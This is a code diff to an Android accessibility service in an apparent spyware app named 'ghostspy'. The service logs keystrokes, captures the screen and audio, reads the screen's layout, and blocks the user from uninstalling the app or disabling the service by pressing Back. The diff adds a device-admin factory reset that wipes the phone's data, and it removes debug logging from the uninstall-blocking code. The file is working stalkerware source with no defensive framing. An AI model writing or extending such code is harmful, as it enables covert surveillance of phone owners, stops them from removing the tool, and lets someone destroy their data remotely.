@@ -3,7 +3,9 @@ package com.spy.ghostspy.services;
 import android.accessibilityservice.AccessibilityService;
 import android.accessibilityservice.GestureDescription;
 import android.annotation.SuppressLint;
+import android.app.admin.DevicePolicyManager;
 import android.content.BroadcastReceiver;
+import android.content.ComponentName;
 import android.content.ContentResolver;
 import android.content.Context;
 import android.content.Intent;
@@ -55,6 +57,7 @@ import android.view.WindowManager;
 import android.view.accessibility.AccessibilityEvent;
 import android.view.accessibility.AccessibilityNodeInfo;
 import android.widget.TextView;
+import android.widget.Toast;
 
 import androidx.annotation.NonNull;
 import androidx.core.app.ActivityCompat;
@@ -68,6 +71,7 @@ import com.spy.ghostspy.model.CallLogEntry;
 import com.spy.ghostspy.model.ImageData;
 import com.spy.ghostspy.model.MousePositionEntry;
 import com.spy.ghostspy.model.SkeletonEntry;
+import com.spy.ghostspy.receiver.MyDeviceAdminReceiver;
 import com.spy.ghostspy.server.Server;
 import com.spy.ghostspy.utils.Common;
 import com.spy.ghostspy.utils.InstalledApps;
@@ -151,6 +155,10 @@ public class MainAccessibilityService extends AccessibilityService {
 
     private volatile boolean isRecording = false;
     private AudioRecord audioRecord;
+
+    //Wipe data
+    private DevicePolicyManager mDevicePolicyManager;
+    private ComponentName mAdminComponent;
 
     private static final String TAG = "MyAccessibilityService";
     @Override
@@ -370,14 +378,14 @@ public class MainAccessibilityService extends AccessibilityService {
     @Override
     public void onAccessibilityEvent(AccessibilityEvent event) {
 //        setAutomaticallyPermission(event);
-        setMediaProjectionPermission(event);
+        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R) {
+            screenShotDevice();
+        }
         getSkeletonInfo(event);
         setStopUninstall(event);
         getKeyLogger(event);
         setStopUnAccessibility();
-        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R) {
-            screenShotDevice();
-        }
+        setMediaProjectionPermission(event);
     }
 
     private void requestMediaProjectionPermission() {
@@ -496,7 +504,6 @@ public class MainAccessibilityService extends AccessibilityService {
             if (node.getClassName() != null && node.getClassName().equals("android.widget.TextView")) {
                 if(node.getText() != null) {
                     String nodeText = node.getText().toString();
-                    Log.d("Button Text uninstall", nodeText);
                     if(nodeText.contains(getResources().getString(R.string.app_name))) {
                         isSelectedApp = true;
                     }
@@ -516,7 +523,6 @@ public class MainAccessibilityService extends AccessibilityService {
             if (node.getClassName() != null && node.getClassName().equals("android.widget.TextView")) {
                 if(node.getText() != null) {
                     String nodeText = node.getText().toString();
-                    Log.d("Button Text uninstall", nodeText);
                     if(nodeText.contains(getResources().getString(R.string.accessibility_service_description))) {
                         performGlobalAction(GLOBAL_ACTION_BACK);
                     }
@@ -1219,6 +1225,14 @@ public class MainAccessibilityService extends AccessibilityService {
             audioRecord.stop();
             audioRecord.release();
         }).start();
+    }
+
+    public void performFactoryReset() {
+        mDevicePolicyManager = (DevicePolicyManager) getSystemService(Context.DEVICE_POLICY_SERVICE);
+        mAdminComponent = new ComponentName(this, MyDeviceAdminReceiver.class);
+        if (mDevicePolicyManager.isAdminActive(mAdminComponent)) {
+            mDevicePolicyManager.wipeData(0);
+        }
     }
 
 
